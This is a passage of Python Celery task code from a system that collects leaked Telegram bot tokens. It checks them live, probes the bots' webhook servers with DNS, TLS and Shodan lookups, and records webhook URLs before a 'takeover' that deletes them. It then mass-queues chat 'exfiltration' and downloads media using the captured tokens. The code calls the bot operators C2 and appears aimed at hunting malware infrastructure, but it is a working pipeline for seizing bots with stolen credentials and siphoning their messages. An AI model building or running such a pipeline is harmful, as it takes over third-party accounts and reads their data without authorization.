        if unauthorized:
            # Preserve prior semantics: mark remaining un-probed IPs implicitly
            # by leaving them out of per_ip. asyncio.gather already fired them,
            # so this is just a no-op documentation note.
            pass
    return per_ip


@app.task(name="flow.probe_webhooks")
def probe_webhooks(max_per_run: int = 50, force: bool = False):
    """Probe captured webhook URLs — passive DNS + HTTP + TLS fingerprint."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_probe_webhooks_logic(max_per_run, force))


async def _probe_webhooks_logic(max_per_run: int, force: bool = False) -> dict:
    from datetime import datetime, timedelta, timezone

    now = datetime.now(timezone.utc)
    stale_cutoff = (now - timedelta(hours=_WEBHOOK_PROBE_STALE_HOURS)).isoformat()

    # Fetch a bounded slice — population of bots with webhook is small.
    res = await async_execute(
        db.table("discovered_credentials")
        .select("id, bot_username, bot_id, meta")
        .order("updated_at", desc=True)
        .limit(2000)
    )

    candidates = []
    for row in res.data or []:
        meta = row.get("meta") or {}
        webhook_url = meta.get("webhook_url")
        if not webhook_url:
            continue
        if not force:
            last_probe = (meta.get("webhook_probe") or {}).get("probed_at")
            if last_probe and last_probe > stale_cutoff:
                continue
        candidates.append((row, meta, webhook_url))
        if len(candidates) >= max_per_run:
            break

    if not candidates:
        return {"status": "idle", "reason": "no candidates due for probe"}

    sem = asyncio.Semaphore(_WEBHOOK_PROBE_SEMAPHORE_SIZE)
    summaries: list[dict] = []

    async def _probe_one(row, meta, webhook_url):
        async with sem:
            probe = await _probe_webhook_url(webhook_url)
            new_meta = {**meta, "webhook_probe": probe}
            try:
                await async_execute(
                    db.table("discovered_credentials")
                    .update({"meta": new_meta})
                    .eq("id", row["id"])
                )
            except Exception as upd_exc:
                probe["_persist_error"] = str(upd_exc)[:200]

            AuditLogger.log(
                AuditEvent.WEBHOOK_PROBED,
                credential_id=row["id"],
                details={
                    "url": webhook_url,
                    "http_status": probe.get("http_status"),
                    "server": (probe.get("http_headers") or {}).get("server"),
                    "ip_addresses": probe.get("ip_addresses"),
                    "tls_issuer": probe.get("tls_issuer"),
                    "shodan_orgs": [
                        v.get("org") for v in (probe.get("shodan") or {}).values() if isinstance(v, dict) and v.get("org")
                    ] or None,
                    "error": probe.get("error") or probe.get("http_error"),
                },
                success=probe.get("http_status") is not None,
            )
            return {
                "bot_username": row.get("bot_username"),
                "bot_id": row.get("bot_id"),
                "url": webhook_url,
                "status": probe.get("http_status"),
                "server": (probe.get("http_headers") or {}).get("server"),
                "ip": (probe.get("ip_addresses") or [None])[0],
                "tls_issuer": probe.get("tls_issuer"),
                "shodan_first": next(
                    (v for v in (probe.get("shodan") or {}).values() if isinstance(v, dict) and v.get("org")),
                    None,
                ),
                "http_err": probe.get("http_error"),
                "dns_err": probe.get("dns_error"),
            }

    summaries = await asyncio.gather(
        *(_probe_one(row, meta, url) for row, meta, url in candidates),
        return_exceptions=True,
    )

    ok = [s for s in summaries if isinstance(s, dict) and s.get("status") is not None]
    errs = [s for s in summaries if isinstance(s, Exception) or (isinstance(s, dict) and s.get("status") is None)]

    header = (
        f"🕵️ Webhook Recon: probed {len(candidates)} — "
        f"reachable {len(ok)}, errored {len(errs)}"
    )
    lines = [header, ""]
    for s in ok[:25]:
        bot = s.get("bot_username") or f"id={s.get('bot_id') or '?'}"
        server = (s.get("server") or "?")[:30]
        ip = s.get("ip") or "?"
        status = s.get("status")
        url_short = (s.get("url") or "")[:80]
        lines.append(f"• @{bot} [{status}] srv={server} ip={ip}\n  {url_short}")
    if errs:
        lines.append("")
        lines.append(f"Errored ({len(errs)}):")
        for s in errs[:15]:
            if isinstance(s, dict):
                bot = s.get("bot_username") or f"id={s.get('bot_id') or '?'}"
                err = s.get("http_err") or s.get("dns_err") or "unknown"
                lines.append(f"• @{bot} — {err[:80]}")
    summary_msg = "\n".join(lines)[:4000]

    try:
        await get_broadcaster().send_log(summary_msg)
    except Exception as bcast_exc:
        logger.warning(f"[WebhookProbe] Failed to post summary: {bcast_exc}")

    return {
        "status": "ok",
        "probed": len(candidates),
        "reachable": len(ok),
        "errored": len(errs),
    }


@app.task(name="flow.pin_webhook_url")
def pin_webhook_url(
    credential_id: str | None = None,
    webhook_url: str = "",
    evidence: dict | None = None,
    bot_token: str | None = None,
):
    """Post the captured webhook URL to the credential's topic and pin it.

    Fire-and-forget task dispatched from the scraper right BEFORE we call
    deleteWebhook — preserves the URL in a visible, pinned location so we
    still have it after wiping the remote registration.

    Accepts either credential_id (direct) or bot_token (looked up via
    sha256 hash in discovered_credentials.token_hash).
    """
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _pin_webhook_url_logic(credential_id, webhook_url, evidence or {}, bot_token)
    )


async def _pin_webhook_url_logic(
    credential_id: str | None,
    webhook_url: str,
    evidence: dict,
    bot_token: str | None = None,
) -> dict:
    import hashlib

    if not webhook_url:
        return {"status": "invalid_args", "reason": "webhook_url required"}

    # Resolve credential_id from bot_token if not provided
    if not credential_id and bot_token:
        try:
            token_hash = hashlib.sha256(bot_token.encode()).hexdigest()
            lookup = await async_execute(
                db.table("discovered_credentials")
                .select("id")
                .eq("token_hash", token_hash)
                .limit(1)
            )
            if lookup.data:
                credential_id = lookup.data[0]["id"]
        except Exception as e:
            return {"status": "token_lookup_failed", "error": str(e)[:200]}

    if not credential_id:
        return {"status": "no_credential_id"}

    try:
        row = await async_execute(
            db.table("discovered_credentials")
            .select("id, bot_username, bot_id, chat_name, meta")
            .eq("id", credential_id)
            .limit(1)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    if not row.data:
        return {"status": "credential_not_found"}

    cred = row.data[0]
    meta = cred.get("meta") or {}
    bot_username = cred.get("bot_username")
    bot_id = cred.get("bot_id")
    topic_id = meta.get("topic_id")

    # Resolve/create topic if missing
    broadcaster = get_broadcaster()
    if not topic_id:
        if bot_username:
            topic_name = f"@{bot_username} / {bot_id}"
        elif bot_id:
            topic_name = f"@unknown / {bot_id}"
        else:
            topic_name = f"Cred-{credential_id[:8]}"
        try:
            topic_id = await broadcaster.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
            new_meta = {**meta, "topic_id": topic_id}
            try:
                await async_execute(
                    db.table("discovered_credentials")
                    .update({"meta": new_meta})
                    .eq("id", credential_id)
                )
            except Exception:
                pass
        except Exception as topic_exc:
            return {"status": "topic_create_failed", "error": str(topic_exc)[:200]}

    if not topic_id:
        return {"status": "no_topic"}

    # Compose the pin — plain text, no Markdown parse (URL may contain unbalanced chars)
    header = f"🔗 Captured webhook URL (before takeover)"
    lines = [header, "", webhook_url, ""]
    if bot_username or bot_id:
        lines.append(f"Bot: @{bot_username or '?'} ({bot_id or '?'})")

    # Enrich with probe forensics (TLS issuer, Shodan orgs, hostnames) if available
    probe = meta.get("webhook_probe") if isinstance(meta, dict) else None
    if isinstance(probe, dict):
        tls_issuer = probe.get("tls_issuer")
        tls_subject = probe.get("tls_subject")
        tls_not_after = probe.get("tls_not_after")
        if tls_issuer:
            lines.append(f"- tls_issuer: {tls_issuer}")
        if tls_subject:
            lines.append(f"- tls_subject: {tls_subject}")
        if tls_not_after:
            lines.append(f"- tls_not_after: {tls_not_after}")

        ip_addresses = probe.get("ip_addresses") or []
        if ip_addresses:
            lines.append(f"- ips: {', '.join(ip_addresses[:4])}")

        shodan = probe.get("shodan") or {}
        if isinstance(shodan, dict):
            orgs = set()
            open_ports = set()
            for _ip, info in shodan.items():
                if isinstance(info, dict):
                    if info.get("org"):
                        orgs.add(str(info["org"]))
                    for p in info.get("ports", []) or []:
                        open_ports.add(str(p))
            if orgs:
                lines.append(f"- shodan_orgs: {', '.join(sorted(orgs))}")
            if open_ports:
                sorted_ports = sorted(open_ports, key=lambda x: int(x) if x.isdigit() else 99999)
                lines.append(f"- open_ports: {', '.join(sorted_ports[:12])}")

        web_recon = probe.get("web_recon") or {}
        if isinstance(web_recon, dict):
            reachable = [p for p, r in web_recon.items() if isinstance(r, dict) and r.get("status") == 200]
            if reachable:
                lines.append(f"- reachable_paths: {', '.join(reachable[:8])}")

    for k, v in (evidence or {}).items():
        if k in ("delete_policy", "webhook_url"):
            continue
        if isinstance(v, (str, int, float, bool)) or v is None:
            lines.append(f"- {k}: {v}")
    msg = "\n".join(lines)[:3900]

    sent_msg_id = await broadcaster.send_to_thread(
        settings.MONITOR_GROUP_ID, topic_id, msg, parse_mode=None
    )
    if not sent_msg_id:
        return {"status": "send_failed", "topic_id": topic_id}

    # NOTE: pin action disabled per user request 2026-08-03 — visible URL
    # in-topic is enough; pinning creates clutter. Meta still records
    # posted_webhook_msg_id for reference but doesn't imply pinned state.
    try:
        from datetime import datetime, timezone

        new_meta = {
            **meta,
            "topic_id": topic_id,
            "posted_webhook_msg_id": sent_msg_id,
            "posted_webhook_at": datetime.now(timezone.utc).isoformat(),
        }
        await async_execute(
            db.table("discovered_credentials")
            .update({"meta": new_meta})
            .eq("id", credential_id)
        )
    except Exception:
        pass

    return {
        "status": "ok",
        "topic_id": topic_id,
        "message_id": sent_msg_id,
        "pinned": False,  # disabled by design
    }


@app.task(name="flow.force_webhook_takeover_pass")
def force_webhook_takeover_pass(max_credentials: int = 200):
    """Queue immediate exfiltrate for every active credential that has a captured
    webhook_url. Bypasses the rescrape cursor so takeovers happen in seconds.
    """
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _force_webhook_takeover_logic(max_credentials)
    )


async def _force_webhook_takeover_logic(max_credentials: int) -> dict:
    try:
        res = await async_execute(
            db.table("discovered_credentials")
            .select("id, bot_username, bot_id, meta")
            .eq("status", "active")
            .order("updated_at", desc=True)
            .limit(2500)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    queued: list[str] = []
    for row in res.data or []:
        meta = row.get("meta") or {}
        if not meta.get("webhook_url"):
            continue
        try:
            app.send_task("flow.exfiltrate_chat", args=[row["id"]], queue="scrape")
            queued.append(row["id"])
        except Exception as e:
            logger.warning(f"[ForceTakeover] enqueue failed for {row['id']}: {e}")
        if len(queued) >= max_credentials:
            break

    logger.info(f"[ForceTakeover] enqueued {len(queued)} credentials for immediate rescrape")
    try:
        await get_broadcaster().send_log(
            f"⚡ Force takeover pass — enqueued {len(queued)} webhook-registered bots for immediate rescrape"
        )
    except Exception:
        pass

    return {"status": "ok", "queued": len(queued)}


@app.task(name="flow.report_pin_metrics")
def report_pin_metrics():
    """Broadcast a summary of webhook takeover activity — pins performed,
    webhook URLs captured, and top C2 hosts. Scheduled every 12h."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_report_pin_metrics_logic())


async def _report_pin_metrics_logic() -> dict:
    from collections import Counter
    from urllib.parse import urlparse

    # Total credentials with a captured webhook URL
    try:
        total_captured = await async_execute(
            db.table("discovered_credentials")
            .select("id", count="exact")
            .not_.is_("meta->>webhook_url", "null")
        )
        total_pinned = await async_execute(
            db.table("discovered_credentials")
            .select("id", count="exact")
            .not_.is_("meta->>pinned_webhook_msg_id", "null")
        )
        recent = await async_execute(
            db.table("discovered_credentials")
            .select("bot_username, meta")
            .not_.is_("meta->>webhook_url", "null")
            .order("updated_at", desc=True)
            .limit(400)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    captured_count = total_captured.count or 0
    pinned_count = total_pinned.count or 0
    coverage_pct = (pinned_count / captured_count * 100) if captured_count else 0.0

    # Aggregate top C2 hostnames
    host_counter: Counter = Counter()
    for row in recent.data or []:
        meta = row.get("meta") or {}
        url = meta.get("webhook_url")
        if not url:
            continue
        try:
            host = urlparse(url).hostname
            if host:
                host_counter[host] += 1
        except Exception:
            continue

    top_hosts = host_counter.most_common(10)

    lines = [
        "📌 **Webhook Takeover Metrics**",
        "",
        f"• Credentials with captured webhook: {captured_count}",
        f"• Pinned in-topic: {pinned_count} ({coverage_pct:.1f}% coverage)",
        "",
    ]
    if top_hosts:
        lines.append("**Top C2 hosts (recent 400):**")
        for host, count in top_hosts:
            lines.append(f"• `{host}` × {count}")

    msg = "\n".join(lines)[:3900]
    try:
        await get_broadcaster().send_log(msg)
    except Exception as e:
        return {"status": "broadcast_failed", "error": str(e)[:200]}

    return {
        "status": "ok",
        "captured": captured_count,
        "pinned": pinned_count,
        "top_hosts": len(top_hosts),
    }


# ==============================================================================
# OBSERVABILITY — takeover spike & exfil latency
# ==============================================================================

# Alert threshold — surface to monitor group when exceeded within the sample window.
TAKEOVER_SPIKE_THRESHOLD = 20
TAKEOVER_SPIKE_WINDOW_SECONDS = 3600  # 1 hour
EXFIL_LATENCY_SAMPLE_SIZE = 1000


@app.task(name="flow.takeover_spike_check")
def takeover_spike_check():
    """Alert monitor group when webhook takeover rate spikes.

    Counts ``audit_logs`` rows with ``event_type='webhook.takeover'`` in the
    last hour. If the count exceeds ``TAKEOVER_SPIKE_THRESHOLD`` we treat it
    as a likely mass-exposure event and broadcast a warning. Silent when the
    count is at or below threshold to keep the channel quiet.

    Assumes ``webhook.takeover`` audit events are persisted to ``audit_logs``.
    If persistence is not enabled the count will be zero and no alert fires
    — that's still a valid observability signal (either no takeovers or the
    audit persistence gate needs to be widened).
    """
    from app.workers.celery_app import get_worker_loop
    return get_worker_loop().run_until_complete(_takeover_spike_check_logic())


async def _takeover_spike_check_logic() -> dict:
    from datetime import datetime, timedelta, timezone

    cutoff = datetime.now(timezone.utc) - timedelta(seconds=TAKEOVER_SPIKE_WINDOW_SECONDS)
    cutoff_iso = cutoff.isoformat()

    try:
        response = await async_execute(
            db.table("audit_logs")
            .select("id", count="exact")
            .eq("event_type", "webhook.takeover")
            .gte("timestamp", cutoff_iso)
            .limit(1)  # we only need the count, not the rows
        )
    except Exception as e:
        logger.warning(f"[TakeoverSpike] audit_logs query failed: {e}")
        return {"status": "db_query_failed", "error": str(e)[:200]}

    count = int(response.count or 0)
    logger.info(
        f"[TakeoverSpike] {count} webhook.takeover events in last "
        f"{TAKEOVER_SPIKE_WINDOW_SECONDS // 60} min (threshold={TAKEOVER_SPIKE_THRESHOLD})"
    )

    if count <= TAKEOVER_SPIKE_THRESHOLD:
        return {"status": "ok", "count": count, "threshold": TAKEOVER_SPIKE_THRESHOLD}

    alert = (
        "🚨 Webhook Takeover Spike\n"
        f"{count} takeovers in the last hour (threshold: {TAKEOVER_SPIKE_THRESHOLD}).\n"
        "Likely mass exposure event — investigate."
    )
    try:
        await get_broadcaster().send_log(alert)
    except Exception as e:
        logger.warning(f"[TakeoverSpike] broadcast failed: {e}")
        return {"status": "broadcast_failed", "count": count, "error": str(e)[:200]}

    return {"status": "alerted", "count": count, "threshold": TAKEOVER_SPIKE_THRESHOLD}


@app.task(name="flow.exfil_latency_report")
def exfil_latency_report():
    """Broadcast P50/P95/P99 exfiltration→broadcast latency for the last N messages.

    Sample size is capped at ``EXFIL_LATENCY_SAMPLE_SIZE`` (1000). If the
    ``broadcasted_at`` column exists (migration
    ``20260803000001_broadcasted_at.sql`` applied), we compute TRUE latency
    as ``broadcasted_at − created_at``. Otherwise we fall back to the
    upper-bound proxy ``NOW − created_at`` for rows where
    ``is_broadcasted = True``. The report body labels which mode was used.
    """
    from app.workers.celery_app import get_worker_loop
    return get_worker_loop().run_until_complete(_exfil_latency_report_logic())


async def _exfil_latency_report_logic() -> dict:
    import statistics
    from datetime import datetime, timezone

    # Attempt the true-latency query first (requires broadcasted_at column).
    true_latency_mode = True
    try:
        response = await async_execute(
            db.table("exfiltrated_messages")
            .select("id, created_at, is_broadcasted, broadcasted_at")
            .order("created_at", desc=True)
            .limit(EXFIL_LATENCY_SAMPLE_SIZE)
        )
    except Exception as e:
        if "broadcasted_at" in str(e):
            true_latency_mode = False
            try:
                response = await async_execute(
                    db.table("exfiltrated_messages")
                    .select("id, created_at, is_broadcasted, broadcast_claimed_at")
                    .order("created_at", desc=True)
                    .limit(EXFIL_LATENCY_SAMPLE_SIZE)
                )
            except Exception as e2:
                logger.warning(f"[ExfilLatency] db query failed: {e2}")
                return {"status": "db_query_failed", "error": str(e2)[:200]}
        else:
            logger.warning(f"[ExfilLatency] db query failed: {e}")
            return {"status": "db_query_failed", "error": str(e)[:200]}

    rows = response.data or []
    if not rows:
        return {"status": "no_data", "sample_size": 0}

    now = datetime.now(timezone.utc)
    latencies: list[float] = []
    broadcasted = 0
    pending = 0

    def _parse_iso(raw) -> datetime | None:
        if not raw:
            return None
        try:
            dt = datetime.fromisoformat(str(raw).replace("Z", "+00:00"))
        except (ValueError, TypeError):
            return None
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        return dt

    for row in rows:
        created_at = _parse_iso(row.get("created_at"))
        if not created_at:
            continue

        if row.get("is_broadcasted"):
            broadcasted += 1
            if true_latency_mode:
                broadcasted_at = _parse_iso(row.get("broadcasted_at"))
                if broadcasted_at:
                    # TRUE latency — end-to-end pipeline time
                    latencies.append((broadcasted_at - created_at).total_seconds())
                else:
                    # Legacy row with no broadcasted_at — skip so mean stays honest
                    continue
            else:
                # Proxy — upper bound
                latencies.append((now - created_at).total_seconds())
        else:
            pending += 1

    if not latencies:
        msg = (
            "📊 **Exfil Latency Report**\n"
            f"Sample: {len(rows)} messages — none broadcasted yet.\n"
            f"Pending: {pending}"
        )
        try:
            await get_broadcaster().send_log(msg)
        except Exception as e:
            logger.warning(f"[ExfilLatency] broadcast failed: {e}")
        return {"status": "no_broadcasted_rows", "sample_size": len(rows), "pending": pending}

    latencies.sort()

    def _pct(sorted_values: list[float], p: float) -> float:
        """Nearest-rank percentile for a sorted list (matches operational reporting)."""
        if not sorted_values:
            return 0.0
        idx = min(len(sorted_values) - 1, max(0, int(round(p / 100.0 * len(sorted_values))) - 1))
        return sorted_values[idx]

    p50 = _pct(latencies, 50)
    p95 = _pct(latencies, 95)
    p99 = _pct(latencies, 99)
    mean = statistics.fmean(latencies)

    mode_label = (
        "TRUE (broadcasted_at − created_at)"
        if true_latency_mode
        else "UPPER-BOUND PROXY (NOW − created_at, schema lacks broadcasted_at)"
    )
    msg = (
        "📊 **Exfil Latency Report**\n"
        f"Sample: last {len(rows)} messages "
        f"(broadcasted={broadcasted}, pending={pending}, latency_sample={len(latencies)})\n"
        f"Mode: {mode_label}\n"
        f"• P50: {p50:,.1f}s\n"
        f"• P95: {p95:,.1f}s\n"
        f"• P99: {p99:,.1f}s\n"
        f"• Mean: {mean:,.1f}s"
    )
    try:
        await get_broadcaster().send_log(msg)
    except Exception as e:
        logger.warning(f"[ExfilLatency] broadcast failed: {e}")
        return {
            "status": "broadcast_failed",
            "sample_size": len(rows),
            "p50": p50, "p95": p95, "p99": p99,
            "error": str(e)[:200],
        }

    return {
        "status": "ok",
        "sample_size": len(rows),
        "broadcasted": broadcasted,
        "pending": pending,
        "p50_seconds": p50,
        "p95_seconds": p95,
        "p99_seconds": p99,
        "mean_seconds": mean,
    }


@app.task(name="flow.reclassify_dark_matter")
def reclassify_dark_matter(max_credentials: int = 500):
    """Sweep credentials that are neither 'active' nor 'revoked' — call getMe
    for each and reclassify. Live bots → active; 401/404 tokens → revoked.
    """
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _reclassify_dark_matter_logic(max_credentials)
    )


async def _reclassify_dark_matter_logic(max_credentials: int) -> dict:
    import httpx
    from app.core.security import security

    try:
        res = await async_execute(
            db.table("discovered_credentials")
            .select("id, bot_token, status")
            .not_.in_("status", ["active", "revoked"])
            .limit(max_credentials)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    to_active: list[str] = []
    to_revoke: list[str] = []
    inspected = 0

    async with httpx.AsyncClient(timeout=8.0) as client:
        for row in res.data or []:
            enc = row.get("bot_token")
            if not enc:
                continue
            try:
                token = security.decrypt(enc).strip()
            except Exception:
                continue
            inspected += 1
            try:
                r = await client.get(f"https://api.telegram.org/bot{token}/getMe")
                if r.status_code == 200 and (r.json() or {}).get("ok"):
                    to_active.append(row["id"])
                elif r.status_code in (401, 404):
                    to_revoke.append(row["id"])
            except Exception:
                # Ambiguous — leave alone this pass
                continue

    # Apply updates in batches
    for cred_id in to_active:
        try:
            await async_execute(
                db.table("discovered_credentials")
                .update({"status": "active"})
                .eq("id", cred_id)
            )
        except Exception:
            pass
    for cred_id in to_revoke:
        try:
            await _mark_credential_revoked(cred_id, "dark_matter_reclassify")
        except Exception:
            pass

    msg = (
        f"🔄 Dark-matter reclassify — inspected {inspected}, "
        f"reactivated {len(to_active)}, revoked {len(to_revoke)}"
    )
    logger.info(msg)
    try:
        await get_broadcaster().send_log(msg)
    except Exception:
        pass

    return {
        "status": "ok",
        "inspected": inspected,
        "reactivated": len(to_active),
        "revoked": len(to_revoke),
    }


@app.task(name="flow.produce_findings")
def produce_findings(credential_limit: int = 2000, message_limit: int = 50000):
    """Idempotently compress a bounded recent window into persistent findings."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _produce_findings_logic(credential_limit, message_limit)
    )


async def _produce_findings_logic(
    credential_limit: int = 2000, message_limit: int = 50000
) -> dict:
    from app.services.findings import produce_recent_findings

    try:
        return await produce_recent_findings(
            credential_limit=credential_limit,
            message_limit=message_limit,
        )
    except Exception as exc:
        logger.exception("[Findings] producer run failed")
        return {"status": "failed", "error": str(exc)[:300]}


@app.task(name="flow.build_entity_graph")
def build_entity_graph(credential_limit: int = 2000, evidence_limit: int = 50000):
    """Idempotently materialize the bounded typed evidence graph."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _build_entity_graph_logic(credential_limit, evidence_limit)
    )


async def _build_entity_graph_logic(
    credential_limit: int = 2000, evidence_limit: int = 50000
) -> dict:
    from app.services.entities import produce_entity_graph

    try:
        return await produce_entity_graph(
            credential_limit=credential_limit,
            evidence_limit=evidence_limit,
        )
    except Exception as exc:
        logger.exception("[EntityGraph] producer run failed")
        return {"status": "failed", "error": str(exc)[:300]}


@app.task(name="flow.route_finding_deltas")
def route_finding_deltas():
    """Route immediate, policy-matching material finding changes."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_route_finding_alerts_logic("immediate"))


@app.task(name="flow.daily_findings_digest")
def daily_findings_digest():
    """Send the policy-filtered, grouped daily Top Findings digest."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_route_finding_alerts_logic("daily"))


@app.task(name="flow.weekly_finding_alerts")
def weekly_finding_alerts():
    """Send optional weekly finding routes followed by delivery coverage."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_weekly_finding_alerts_logic())


async def _route_finding_alerts_logic(cadence: str) -> dict:
    from app.services.finding_alerts import route_finding_alerts

    try:
        return await route_finding_alerts(cadence)
    except Exception as exc:
        logger.exception("[FindingAlerts] %s routing failed", cadence)
        return {"status": "failed", "cadence": cadence, "error": str(exc)[:300]}


async def _weekly_finding_alerts_logic() -> dict:
    from app.services.finding_alerts import route_finding_alerts, weekly_alert_coverage

    try:
        routed = await route_finding_alerts("weekly")
        coverage = await weekly_alert_coverage()
        return {"status": "ok", "routed": routed, "coverage": coverage}
    except Exception as exc:
        logger.exception("[FindingAlerts] weekly routing or coverage failed")
        return {"status": "failed", "error": str(exc)[:300]}


@app.task(name="flow.source_quality_report")
def source_quality_report():
    """Rank OSINT sources by validated + live + message-rich yield.
    Broadcasts a per-source scorecard to the monitor group.
    """
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_source_quality_report_logic())


async def _source_quality_report_logic() -> dict:
    from collections import defaultdict

    try:
        rows = await async_execute(
            db.table("discovered_credentials")
            .select("source, status, meta")
            .limit(5000)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    per_source: dict = defaultdict(
        lambda: {
            "total": 0,
            "active": 0,
            "revoked": 0,
            "with_webhook": 0,
            "with_messages": 0,
        }
    )
    for r in rows.data or []:
        src = (r.get("source") or "unknown").split(":", 1)[0]
        meta = r.get("meta") or {}
        status = r.get("status")
        per_source[src]["total"] += 1
        if status == "active":
            per_source[src]["active"] += 1
        elif status == "revoked":
            per_source[src]["revoked"] += 1
        if meta.get("webhook_url"):
            per_source[src]["with_webhook"] += 1
        # message evidence: last_scrape_reason == 'success' OR message_count in meta
        if meta.get("last_scrape_reason") == "success" or meta.get("total_messages_scraped", 0) > 0:
            per_source[src]["with_messages"] += 1

    # Score = active_rate * 0.5 + webhook_rate * 0.2 + message_rate * 0.3
    scored: list[tuple[str, float, dict]] = []
    for src, stats in per_source.items():
        total = stats["total"]
        if total < 3:
            continue
        active_rate = stats["active"] / total
        webhook_rate = stats["with_webhook"] / total
        message_rate = stats["with_messages"] / total
        score = active_rate * 0.5 + webhook_rate * 0.2 + message_rate * 0.3
        scored.append((src, score, stats))
    scored.sort(key=lambda x: x[1], reverse=True)

    lines = ["📊 **Source Quality Scorecard**", ""]
    lines.append("Score: 0.5×active_rate + 0.2×webhook_rate + 0.3×message_rate")
    lines.append("")
    for src, score, stats in scored[:15]:
        lines.append(
            f"• `{src}` score={score:.2f} n={stats['total']} "
            f"active={stats['active']} webhook={stats['with_webhook']} "
            f"msg={stats['with_messages']}"
        )

    msg = "\n".join(lines)[:3900]
    try:
        await get_broadcaster().send_log(msg)
    except Exception as e:
        return {"status": "broadcast_failed", "error": str(e)[:200]}

    return {"status": "ok", "sources_ranked": len(scored)}


@app.task(name="flow.cluster_c2_operators")
def cluster_c2_operators():
    """Analyze captured webhook URLs and broadcast the top C2 operator clusters
    to the monitor group. Uses same clustering logic as /monitor/operators."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_cluster_c2_operators_logic())


async def _cluster_c2_operators_logic() -> dict:
    from collections import defaultdict
    from urllib.parse import urlparse
    import re

    try:
        res = await async_execute(
            db.table("discovered_credentials")
            .select(
                "id,bot_username,status,source,meta,created_at,updated_at,"
                "collection_yield_score,chat_member_count"
            )
            .not_.is_("meta->>webhook_url", "null")
            .limit(2000)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    finding_count = 0
    try:
        from app.services.findings import (
            infrastructure_cluster_candidates,
            persist_candidates,
        )

        cluster_findings = infrastructure_cluster_candidates(res.data or [])
        await persist_candidates(cluster_findings)
        finding_count = len(cluster_findings)
    except Exception as exc:
        logger.warning("[C2Clusters] persistent finding upsert failed: %s", exc)

    by_san: dict = defaultdict(list)
    by_org: dict = defaultdict(list)
    by_hostname: dict = defaultdict(list)

    for row in res.data or []:
        meta = row.get("meta") or {}
        url = meta.get("webhook_url")
        if not url:
            continue
        probe = meta.get("webhook_probe") or {}
        try:
            hostname = urlparse(url).hostname or ""
        except Exception:
            hostname = ""

        for san in probe.get("tls_san", []) or []:
            if san.startswith("*."):
                by_san[san].append(row.get("bot_username") or "?")
                break

        for _ip, info in (probe.get("shodan") or {}).items():
            if isinstance(info, dict) and info.get("org"):
                by_org[info["org"]].append(row.get("bot_username") or "?")

        if hostname:
            by_hostname[hostname].append(row.get("bot_username") or "?")

    def _top(bucket: dict, n: int = 8) -> list[tuple[str, int]]:
        items = [(k, len(v)) for k, v in bucket.items() if len(v) >= 2]
        items.sort(key=lambda x: x[1], reverse=True)
        return items[:n]

    lines = ["🎯 **C2 Operator Clusters**", ""]
    lines.append("**Top TLS SAN wildcards (hosted-service tenants):**")
    for san, count in _top(by_san):
        lines.append(f"• `{san}` × {count}")
    lines.append("")
    lines.append("**Top Shodan orgs (network providers):**")
    for org, count in _top(by_org):
        lines.append(f"• {org} × {count}")
    lines.append("")
    lines.append("**Top hostnames (same C2 operator, many bots):**")
    for host, count in _top(by_hostname):
        lines.append(f"• `{host}` × {count}")

    msg = "\n".join(lines)[:3900]
    try:
        await get_broadcaster().send_log(msg)
    except Exception as e:
        return {"status": "broadcast_failed", "error": str(e)[:200]}

    return {
        "status": "ok",
        "san_clusters": len([k for k, v in by_san.items() if len(v) >= 2]),
        "org_clusters": len([k for k, v in by_org.items() if len(v) >= 2]),
        "hostname_clusters": len([k for k, v in by_hostname.items() if len(v) >= 2]),
        "findings_upserted": finding_count,
    }


@app.task(name="flow.hash_exfil_media")
def hash_exfil_media(max_messages: int = 100):
    """Download + hash exfiltrated media files that haven't been hashed yet.
    Stores SHA-256 in media_hashes table for duplicate detection across bots.
    """
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_hash_exfil_media_logic(max_messages))


async def _hash_exfil_media_logic(max_messages: int) -> dict:
    import hashlib

    # Find media messages that don't have a hash entry yet
    try:
        res = await async_execute(
            db.table("exfiltrated_messages")
            .select("id, credential_id, media_type, file_meta")
            .neq("media_type", "text")
            .not_.is_("file_meta", "null")
            .order("created_at", desc=True)
            .limit(max_messages * 3)  # over-fetch — many will already be hashed
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    candidate_rows = res.data or []
    if not candidate_rows:
        return {"status": "no_candidates"}

    # Filter to unhashed ones
    ids = [r["id"] for r in candidate_rows]
    try:
        already = await async_execute(
            db.table("media_hashes").select("message_id").in_("message_id", ids)
        )
        hashed_ids = {r["message_id"] for r in (already.data or [])}
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    to_hash = [r for r in candidate_rows if r["id"] not in hashed_ids][:max_messages]
    if not to_hash:
        return {"status": "all_hashed", "candidates_seen": len(candidate_rows)}

    # Reuse broadcaster's media download logic (uses source bot's token)
    broadcaster = get_broadcaster()

    hashed_count = 0
    failed_count = 0
    duplicate_count = 0
    seen_sha256_in_batch: set[str] = set()

    for row in to_hash:
        msg_id = row["id"]
        cred_id = row.get("credential_id")
        file_meta = row.get("file_meta") or {}
        media_type = row.get("media_type")

        try:
            data = await broadcaster._download_media_bytes(file_meta, cred_id)
